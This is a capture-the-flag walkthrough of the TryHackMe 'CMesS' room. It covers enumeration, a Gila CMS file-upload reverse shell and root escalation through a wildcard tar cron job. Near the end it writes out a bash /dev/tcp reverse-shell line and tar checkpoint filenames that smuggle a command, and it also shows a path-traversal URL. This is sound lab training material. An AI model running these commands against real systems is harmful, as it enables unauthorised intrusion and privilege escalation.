# [CMesS](https://tryhackme.com/room/cmess)

Before we start, following the hints, we add `MACHINE_IP cmess.thm` to our `/etc/hosts`. We also note that there should be no brute-forcing.

To start off, we run `nmap`.

```
# Nmap 7.92 scan initiated Sat Dec 11 14:53:16 2021 as: nmap -vvv -p 22,80 -sCV -oA init 10.10.74.49
Nmap scan report for cmess.thm (10.10.74.49)
Host is up, received syn-ack (0.21s latency).
Scanned at 2021-12-11 14:53:17 +07 for 14s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvfxduhH7oHBPaAYuN66Mf6eL6AJVYqiFAh6Z0gBpD08k+pzxZDtbA3cdniBw3+DHe/uKizsF0vcAqoy8jHEXOOdsOmJEqYXjLJSayzjnPwFcuaVaKOjrlmWIKv6zwurudO9kJjylYksl0F/mRT6ou1+UtE2K7lDDiy4H3CkBZALJvA0q1CNc53sokAUsf5eEh8/t8oL+QWyVhtcbIcRcqUDZ68UcsTd7K7Q1+GbxNa3wftE0xKZ+63nZCVz7AFEfYF++glFsHj5VH2vF+dJMTkV0jB9hpouKPGYmxJK3DjHbHk5jN9KERahvqQhVTYSy2noh9CBuCYv7fE2DsuDIF
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGOVQ0bHJHx9Dpyf9yscggpEywarn6ZXqgKs1UidXeQqyC765WpF63FHmeFP10e8Vd3HTdT3d/T8Nk3Ojt8mbds=
|   256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFUGmaB6zNbqDfDaG52mR3Ku2wYe1jZX/x57d94nxxkC
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-robots.txt: 3 disallowed entries
|_/src/ /themes/ /lib/
|_http-generator: Gila CMS
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Dec 11 14:53:31 2021 -- 1 IP address (1 host up) scanned in 14.44 seconds
```

We just have SSH and a web server on port 80. Looking at the web server, we see that we have Gila CMS. Since we have a domain name, we can try fuzzing for subdomains.

```sh
$ ffuf -u 'http://cmess.thm/' -H 'Host: FUZZ.cmess.thm' -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fw 522

dev                     [Status: 200, Size: 934, Words: 191, Lines: 31, Duration: 226ms]
```

We add `dev.cmess.thm` to our `/etc/hosts` and take a look at the site. Right on the front page is a conversation giving us a few usernames and the password for andre. I tried to SSH in with that but it didn't work. Since the conversation on the `dev` page mentioned an admin panel, we can try accessing `/admin` which gives us a login page. We can login with `andre@cmess.thm` and the password from the `dev` page.

After logging in, we can see at the bottom of the page that we have Gila CMS version 1.10.9. We can look up exploits known for this version.

```sh
$ searchsploit gila cms
------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                       |  Path
------------------------------------------------------------------------------------- ---------------------------------
Gila CMS 1.11.8 - 'query' SQL Injection                                              | php/webapps/48590.py
Gila CMS 1.9.1 - Cross-Site Scripting                                                | php/webapps/46557.txt
Gila CMS 2.0.0 - Remote Code Execution (Unauthenticated)                             | php/webapps/49412.py
Gila CMS < 1.11.1 - Local File Inclusion                                             | multiple/webapps/47407.txt
------------------------------------------------------------------------------------- ---------------------------------
```

Among the results, only `multiple/webapps/47407.txt` matches the version we're working with. Checking the exploit out, we see that we have LFI. We can easily exploit it as follows.

```
http://cmess.thm/admin/fm/?f=src../../../../../../../../../WINDOWS/system32/drivers/etc/hosts
```

However, that sample URL doesn't seem to actually give us the machine's `hosts` file. Instead, we see that we have listing of a directory, as well as file upload capabilities. We can upload a PHP reverse shell at `http://cmess.thm/admin/fm?f=./`, set up a listener, and go to `http://cmess.thm/assets/shell.php` to trigger it and get a shell as `www-data` on the machine.

Looking in `/var/www/html`, we have `config.php` which contains database credentials. Checking listening ports ...

```sh
www-data@cmess:/var/www/html$ ss -lntp
State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
LISTEN     0      80     127.0.0.1:3306                     *:*
LISTEN     0      128          *:22                       *:*
LISTEN     0      128         :::80                      :::*
LISTEN     0      128         :::22                      :::*
```

... we see that we have MySQL running. We can login with the credentials found in `config.php`.

```sh
www-data@cmess:/var/www/html$ mysql -u root
```

After logging in, we enumerate the databases.

```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| gila               |
| mysql              |
| performance_schema |
| sys                |
+--------------------+

mysql> use gila
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

mysql> show tables;
+----------------+
| Tables_in_gila |
+----------------+
| option         |
| page           |
| post           |
| postcategory   |
| postmeta       |
| user           |
| usermeta       |
| userrole       |
| widget         |
+----------------+

mysql> select * from user;
+----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+
| id | username | email           | pass                                                         | active | reset_code | created             | updated             |
+----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+
|  1 | andre    | andre@cmess.thm | $2y$10$uNAA0MEze02jd.qU9tnYLu43bNo9nujltElcWEAcifNeZdk4bEsBa |      1 |            | 2020-02-06 18:20:34 | 2020-02-06 18:20:34 |
+----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+
```

We have a password hash. I tried cracking it with rockyou but to no avail.

Looking at `/opt`, we have the file `.password.bak` containing andre's password. With that, we can `su andre`.

As andre, we can try checking with `sudo -l` but andre isn't allowed to run `sudo`. Checking cron jobs in `/etc/crontab` ...

```
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

We see `tar` being run by root with a wildcard. We can abuse this by running the following in `/home/andre/backup`:

```sh
echo "bash -c 'exec bash -i &>/dev/tcp/LHOST/1337 <&1'" > shell.sh
touch -- '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh'
```

After setting up a listener and a bit of waiting, we should have a root shell on the machine.
